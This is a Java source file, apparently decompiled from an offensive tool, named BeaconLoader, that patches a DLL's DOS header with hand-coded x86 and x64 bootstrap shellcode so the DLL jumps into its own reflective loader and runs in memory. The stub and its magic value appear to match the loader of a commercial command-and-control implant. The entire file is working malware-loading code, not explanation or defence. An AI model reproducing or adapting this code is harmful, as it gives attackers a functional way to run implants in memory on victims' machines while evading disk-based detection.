package pe;

import common.CommonUtils;
import common.Packer;
import common.ReflectiveDLL;

public class BeaconLoader {
    public static byte[] patchDOSHeader(byte[] arrby) {
        return patchDOSHeader(arrby, 1453503984);
    }

    public static byte[] patchDOSHeader(byte[] arrby, int n) {
        int i = ReflectiveDLL.findReflectiveLoader(arrby);
        if (ReflectiveDLL.is64(arrby))
            throw new RuntimeException("x64 DLL passed to x86 patch function");
        if (i < 0)
            return new byte[0];
        Packer packer = new Packer();
        packer.little();
        packer.addByte(77);
        packer.addByte(90);
        packer.addByte(232);
        packer.addByte(0);
        packer.addByte(0);
        packer.addByte(0);
        packer.addByte(0);
        packer.addByte(91);
        packer.addByte(137);
        packer.addByte(223);
        packer.addByte(82);
        packer.addByte(69);
        packer.addByte(85);
        packer.addByte(137);
        packer.addByte(229);
        packer.addByte(129);
        packer.addByte(195);
        packer.addInt(i - 7);
        packer.addByte(255);
        packer.addByte(211);
        packer.addByte(104);
        packer.addInt(n);
        packer.addByte(104);
        packer.addByte(4);
        packer.addByte(0);
        packer.addByte(0);
        packer.addByte(0);
        packer.addByte(87);
        packer.addByte(255);
        packer.addByte(208);
        byte[] arrby2 = packer.getBytes();
        if (arrby2.length > 62) {
            CommonUtils.print_error("bootstrap length is: " + arrby2.length + " (it's too big!)");
            return new byte[0];
        }
        for (int b = 0; b < arrby2.length; b++) {
            arrby[b] = arrby2[b];
        }
        return arrby;
    }

    public static byte[] patchDOSHeaderX64(byte[] arrby) {
        return patchDOSHeaderX64(arrby, 1453503984);
    }

    public static byte[] patchDOSHeaderX64(byte[] arrby, int n) {
        int i = ReflectiveDLL.findReflectiveLoader(arrby);
        if (!ReflectiveDLL.is64(arrby))
            throw new RuntimeException("x86 DLL passed to x64 patch function");
        if (i < 0)
            return new byte[0];
        Packer packer = new Packer();
        packer.little();
        packer.addByte(77);
        packer.addByte(90);
        packer.addByte(65);
        packer.addByte(82);
        packer.addByte(85);
        packer.addByte(72);
        packer.addByte(137);
        packer.addByte(229);
        packer.addByte(72);
        packer.addByte(129);
        packer.addByte(236);
        packer.addByte(32);
        packer.addByte(0);
        packer.addByte(0);
        packer.addByte(0);
        packer.addByte(72);
        packer.addByte(141);
        packer.addByte(29);
        packer.addByte(234);
        packer.addByte(255);
        packer.addByte(255);
        packer.addByte(255);
        packer.addByte(72);
        packer.addByte(137);
        packer.addByte(223);
        packer.addByte(72);
        packer.addByte(129);
        packer.addByte(195);
        packer.addInt(i);
        packer.addByte(255);
        packer.addByte(211);
        packer.addByte(65);
        packer.addByte(184);
        packer.addInt(n);
        packer.addByte(104);
        packer.addByte(4);
        packer.addByte(0);
        packer.addByte(0);
        packer.addByte(0);
        packer.addByte(90);
        packer.addByte(72);
        packer.addByte(137);
        packer.addByte(249);
        packer.addByte(255);
        packer.addByte(208);
        byte[] arrby2 = packer.getBytes();
        if (arrby2.length > 62) {
            CommonUtils.print_error("bootstrap length is: " + arrby2.length + " (it's too big!)");
            return new byte[0];
        }
        for (int b = 0; b < arrby2.length; b++) {
            arrby[b] = arrby2[b];
        }
        return arrby;
    }
}
